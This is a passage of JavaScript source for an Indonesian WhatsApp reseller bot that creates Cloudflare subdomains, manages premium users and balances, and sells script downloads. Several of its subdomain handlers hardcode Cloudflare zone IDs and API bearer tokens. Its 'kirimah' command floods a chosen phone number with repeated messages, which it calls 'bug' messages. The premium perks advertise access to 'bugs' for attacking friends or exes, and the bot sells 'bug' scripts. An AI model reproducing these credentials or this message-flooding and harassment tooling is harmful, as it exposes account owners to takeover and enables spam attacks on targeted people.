             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
          case 'domain42': {
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain RIDZ STORE\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Wa.me/62895354709030")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "d4a6adffd3dd317753c4401e38cb7949";
               let apitoken = "oMSalNry5ByDu_PBJhTAxNOhQiYKjWQImKKDIhWh";
               let tld = "digital-market.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RIDZ STORE⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
          case 'domain43': {
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain RIDZ STORE\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Wa.me/62895354709030")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "e13ba8568f6e44ca927569da961d9eb6";
               let apitoken = "bTF2B2fQNe0nJL62gTuGQEbeZCEbOC0FpGWB-ESr";
               let tld = "rafatharofficial.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RIDZ STORE⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
          case 'domain44': {
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain RIDZ STORE\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Wa.me/62895354709030")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "fb96c7c37f24377704b78f5cc41af7a5";
               let apitoken = "XL-sfJZLBRtXDxkZ9ElUuxTLTwi95P-z-Ei14pDt";
               let tld = "tokodigital.software";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RIDZ STORE⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
     case 'delgc':
  if (!isOwner) return m.reply(`khusus Creator`)
    if (!isGroup) return m.reply(`Khusus Group`)
var ini = pler.indexOf(m.chat)
pler.splice(ini, 1)
fs.writeFileSync('./all/database/idgrup.json', JSON.stringify(pler))
m.reply(`${command} Sukses Menonaktifkan Fitur Domain Di Grup Ini Tuan✅`)
break
       case 'addgc':
    if (!isGroup) return m.reply(`Khusus Group`)         
if (!isOwner) return m.reply(`khusus Creator`)
pler.push(m.chat)
fs.writeFileSync('./all/database/idgrup.json', JSON.stringify(pler))
m.reply(`${command} Sukses Mengaktifkan Fitur Domain Di Grup Ini Tuan✅`)
           break
        case 'kirimah': {
               if (!isPremium && !isOwner) return reply(mess.only.premium)
  if (!quoted) return m.reply('Format salah!!\nContoh: kirimah text,nomor,jumlah');
  
  let params = text.split(',');
  if (params.length < 3) return m.reply('Format salah!!\nContoh: kirim text,nomor,jumlah');

  let messageText = params[0];
  let targetNumber = params[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  let messageCount = parseInt(params[2]);

  if (isNaN(messageCount) || messageCount < 1) return m.reply('Jumlah pesan harus berupa angka yang lebih besar dari 0.');

  const promises = [];
  for (let i = 0; i < messageCount; i++) {
    promises.push(
      Biiofc.sendMessage(targetNumber, {
        text: `*${messageText}*`,
        mentions: [sender]
      }, {
        quoted: lep
      })
    );
  }

  Promise.all(promises)
    .then(() => {
      m.reply(`Berhasil mengirim ${messageCount} bug pesan!`);
    })
    .catch(() => {
      m.reply('Gagal mengirim pesan!');
    });

  break;
}
        case 'done':{
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*

Penggunaan:
${prefix + command} barang,nominal`);
let barang = t[0];
let nominal = t[1];
reply(`*━━ TRANSAKSI INFO ━━*

 _• *Barang:* ${barang}_
 _• *Nominal:* ${nominal}_
 _• *Tanggal:* Rp${tanggal}_

*TERIMA KASIH TELAH ORDER DI ${global.namaCreator}*\n*JANGAN LUPA ORDER LAGI YA*🙏`)
}
        break
case "tunda": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗣𝗘𝗡𝗗𝗜𝗡𝗚* )▭▬▭


𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗣𝗘𝗡𝗗𝗜𝗡𝗚
𝗛𝗔𝗥𝗔𝗣 𝗕𝗘𝗥𝗦𝗔𝗕𝗔𝗥

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "proses": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *𝗦𝗘𝗗𝗔𝗡𝗚 𝗗𝗜 𝗣𝗥𝗢𝗦𝗘𝗦* )▭▬▭


𝗛𝗮𝗿𝗮𝗽 𝗧𝘂𝗻𝗴𝗴𝘂 𝗦𝗲𝗯𝗲𝗻𝘁𝗮𝗿
𝗣𝗿𝗼𝗱𝘂𝗸 𝗦𝗲𝗱𝗮𝗻𝗴 𝗗𝗶 𝗣𝗿𝗼𝘀𝗲𝘀️

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "batal": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗕𝗔𝗧𝗔𝗟* )▭▬▭

📆 𝗧𝗮𝗻𝗴𝗴𝗮𝗹: ${tanggal}
🕰️ 𝗪𝗮𝗸𝘁𝘂: ${jam}
✨ 𝗦𝘁𝗮𝘁𝘂𝘀: Batal

𝗦𝗲𝗹𝘂𝗿𝘂𝗵 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶 𝗕𝗮𝘁𝗮𝗹

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "reqvps": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *REQUEST VPS* )▭▬▭

Region : 
Os : 
Version : 
Ram : 
Ip : 
Password : 
*Garansi 15 Day*
*Create ${tanggal}*
*Hari Ini ${hariini}*

⸼  ࣪ ׅ ︶︶︶  𖣇𖢅𖣇  ︶︶︶ ⸼  ࣪ ׅ
 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "reqpanel": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *REQUEST PANEL* )▭▬▭

Ram : 
Username :
Nomor Wa : 
*Garansi 7 Day*
*Create ${tanggal}*
*Hari Ini ${hariini}*

⸼  ࣪ ׅ ︶︶︶  𖣇𖢅𖣇  ︶︶︶ ⸼  ࣪ ׅ
 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
        //Bagian Otomatis Menu
        case "buyowner":
if (cekSaldo(sender,db_saldo) < 20000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp20.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62895354709030`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknbos = await Biiofc.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknbos.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
ownerNumber.push(bnnd)
fs.writeFileSync('./all/database/owner.json', JSON.stringify(ownerNumber))
reply(`Selamat Kepada ${pushname} dengan nomor ${bnnd} telah premium 

Keuntungan Owner👇🏻
-Muncul dalam daftar Owner
-Bisa Akses Semua Bug
-Bisa Create Panel
-Bisa Bug Temen Usil
-Bisa Bug Mantan

NOTE:WAJIB JEDA GA JEDA? DELPREM 
#ALL TRX NO REFF`)
        minSaldo(sender, 20000, db_saldo)
break
        case "buyprem":{
if (cekSaldo(sender,db_saldo) < 10000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp10.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62895354709030`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
reply(`Selamat Kepada ${pushname} dengan nomor ${prrkek} telah premium 

Keuntungan Premium👇🏻
-Bisa Akses Semua Bug
-Bisa Create Panel
-Bisa Bug Temen Usil
-Bisa Bug Mantan

NOTE:WAJIB JEDA GA JEDA? DELPREM 
#ALL TRX NO REFF`)
}
   minSaldo(sender, 10000, db_saldo)     
break
        case 'minsaldo':
if (!isOwner) m.reply(`Mau Ngapain Yatim?`) 
if (!q.split(",")[0]) return m.reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 62895354709030,20000`)
if (!q.split(",")[1]) return m.reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 62895354709030,20000`)
if (cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo) < q.split(",")[1] && cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo) !== 0) return m.reply(`Dia saldonya ${cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo)}, jadi jangan melebihi ${cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo)} yah kak🙏`)
minSaldo(q.split(",")[0]+"@s.whatsapp.net", Number(q.split(",")[1]), db_saldo)
await sleep(50)
m.reply(`「 *SALDO USER* 」
⭔ID: ${q.split(",")[0]}
⭔Nomer: @${q.split(",")[0]}
⭔Tanggal: ${tanggal}
⭔Saldo: Rp${toRupiah(cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo))}, `)
break
                case 'buyscpanel': {
       if (cekSaldo(sender,db_saldo) < 15000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 15000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/g26mwz05enfd02p/Sc+Cpanel.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscbugv1': {
       if (cekSaldo(sender,db_saldo) < 15000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 15000, db_saldo)
const baby2 = await mediafireDl('-')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscbugv2': {
       if (cekSaldo(sender,db_saldo) < 25000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp25.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 25000, db_saldo)
const baby2 = await mediafireDl('-')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscbugv3': {
       if (cekSaldo(sender,db_saldo) < 35000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp35.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 35000, db_saldo)
const baby2 = await mediafireDl('-')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscv2': {
       if (cekSaldo(sender,db_saldo) < 15000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 15000, db_saldo)
const baby2 = await mediafireDl('-')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscv3': {
       if (cekSaldo(sender,db_saldo) < 25000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp25.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 25000, db_saldo)
const baby2 = await mediafireDl('-')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscv3subdo': {
       if (cekSaldo(sender,db_saldo) < 30000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp30.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 30000, db_saldo)
const baby2 = await mediafireDl('-')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscv4': {
       if (cekSaldo(sender,db_saldo) < 35000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp35.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 35000, db_saldo)
const baby2 = await mediafireDl('-')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscv5': {
       if (cekSaldo(sender,db_saldo) < 55000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp55.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 55000, db_saldo)
const baby2 = await mediafireDl('-')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscv6': {
       if (cekSaldo(sender,db_saldo) < 60000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp60.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 60000, db_saldo)
const baby2 = await mediafireDl('-')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscv6subdo': {
       if (cekSaldo(sender,db_saldo) < 70000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp70.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 70000, db_saldo)
const baby2 = await mediafireDl('-')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscv7otp': {
       if (cekSaldo(sender,db_saldo) < 75000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp75.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 75000, db_saldo)
const baby2 = await mediafireDl('-')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscv7addpm2': {
       if (cekSaldo(sender,db_saldo) < 85000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp85.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 85000, db_saldo)
const baby2 = await mediafireDl('-')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscjagagrupv1': {
       if (cekSaldo(sender,db_saldo) < 10000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp10.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 10000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/jaxgd3mdrxjkszb/Sc_Jaga_Grup.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscjagagrupv2': {
       if (cekSaldo(sender,db_saldo) < 15000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 15000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/fnbxdwor0ldky84/JagaGrup+V2.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscpushkontak': {
       if (cekSaldo(sender,db_saldo) < 10000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp10.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 10000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/xdh4ocswkkt7tt2/BotSaveContact.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyschwv191': {
       if (cekSaldo(sender,db_saldo) < 20000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp20.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 20000, db_saldo)
const baby2 = await mediafireDl('-')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyschwv192': {
       if (cekSaldo(sender,db_saldo) < 25000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp25.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 25000, db_saldo)
const baby2 = await mediafireDl('-')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyschwv201': {
       if (cekSaldo(sender,db_saldo) < 30000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp30.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 30000, db_saldo)
const baby2 = await mediafireDl('-')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyschwv202': {
       if (cekSaldo(sender,db_saldo) < 45000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp45.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 45000, db_saldo)
const baby2 = await mediafireDl('-')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break               
         case 'buyscpushautosave': {
       if (cekSaldo(sender,db_saldo) < 15000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 15000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/yousxcwwv5cjj0p/SC+PUSH+SIMPLE+BY+RAFATHAR+OFFCIAL.zip/file')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscvps1': {
       if (cekSaldo(sender,db_saldo) < 50000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp50.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 50000, db_saldo)
const baby2 = await mediafireDl('-')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscvps2': {
       if (cekSaldo(sender,db_saldo) < 80000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp80.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 80000, db_saldo)
const baby2 = await mediafireDl('-')
Biiofc.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscjpmv1': {
